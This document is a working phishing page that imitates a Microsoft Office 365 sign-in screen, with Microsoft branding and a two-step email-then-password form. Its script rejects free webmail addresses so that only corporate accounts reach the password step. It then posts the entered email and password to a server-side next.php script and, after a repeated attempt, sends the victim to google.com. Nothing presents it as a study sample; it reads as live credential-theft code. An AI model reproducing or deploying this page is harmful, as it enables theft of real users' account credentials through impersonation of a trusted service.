
<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Office 365</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">

    </style>
  </head>
  <body style="background-image: url('images/bg1.png'); background-size: cover;background-repeat: no-repeat;">
    <div class="container-fluid">
      <div class="container">
        <div class="row my-5 py-5">
          <div class="col-lg-6">
            <div class="text-white my-5 py-3">
              <span class="display-4">Expand Your<br> Office 365</span><br><br>
              <span class="h5 font-weight-normal">Upgrade to ad-free email and the latest productivity tools with office 365.</span><br><br><br>
              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
            </div>
          </div>
          <div class="col-lg-6">
            <div class="m-5 p-4 bg-white" id="div1">
              <img src="images/microsoft_logo.svg" class="img-fluid"><br><br>
              <span class="h5">Sign In</span><br>
              <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
              <div class="form-group mt-2">
                <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
              </div>
              <p>No account? <a href="#">Create one!</a></p>
              <p><a href="#">Sign in with a security key</a></p>
              <p><a href="#">sign in options</a></p>
              <div class="text-right">
                <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
              </div>
            </div>

            <div class="m-5 p-4 bg-white" id="div2">
              <form id="contact">
                <img src="images/microsoft_logo.svg" class="img-fluid"><br><br>
                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span><br>
                <span id="msg" class="text-danger"></span><br>
                <span class="h5">Password</span>
                <div class="form-group mt-2">
                  <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                </div>
                <p>No account? <a href="#">Create one!</a></p>
                <p><a href="#">Sign in with a security key</a></p>
                <p><a href="#">sign in options</a></p>
                <div class="text-right">
                  <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;" >login</button>
                </div>
              </form>
            </div>

          </div>
        </div>
      </div>
    </div>





    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>


  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>


    /* global $ */
    $(document).ready(function(){
      $('#error').hide();
      $("#div2").hide();
      $("#msg").hide();
      $('#email').click(function(){
        $('#error').hide();
      });
      $('#next').click(function () {
        var my_email =$('#email').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(email.value)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        if (final=="gmail" || final=="yahoo" || final=="hotmail" || final=="aol" || final=="outlook") {
         $('#error').show();

       }
       else
       {
        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);

      }
    });
      $('#back').click(function () {
        $("#msg").hide();
        $("#div2").animate({left:200, opacity:"hide"}, 0);
        $("#div1").animate({right:200, opacity:"show"}, 1000);

      });


      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();
        var msg = $('#msg').html();
        $('#msg').text( msg );
        if (msg=="InValid Credentials") {
          window.location.replace("http://google.com");
        }
        else
        {
         $.ajax({
          dataType: 'JSON',
          url: 'next.php',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
          beforeSend: function(xhr){
            $('#submit-btn').html('Verifing...');
          },
          success: function(response){
            if(response){
              $("#msg").show();
              console.log(response);
              if(response['signal'] == 'ok'){
               $('#msg').html(response['msg']);
             }
             else{
              $('#msg').html(response['msg']);
            }
          }
        },
        error: function(){
          $("#msg").show();
          $('#msg').html("Please try again later");
        },
        complete: function(){
          $('#submit-btn').html('Login');
        }
      });
       }
     });
    });
  </script>
  </html>